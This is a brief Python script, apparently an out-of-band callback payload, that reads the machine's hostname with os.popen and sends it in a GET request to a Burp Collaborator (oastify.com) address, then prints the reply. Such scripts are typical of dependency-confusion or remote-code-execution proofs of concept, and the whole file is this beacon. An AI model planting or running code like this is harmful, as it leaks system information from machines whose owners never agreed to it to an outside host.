import os
import requests

hostname = os.popen('hostname').read().strip()

yoursrv = "https://bzezu656r0oydltkepbbu319208twmkb.oastify.com/hello"

response = requests.get(yoursrv, params={'hostname':hostname})

print(response.text)

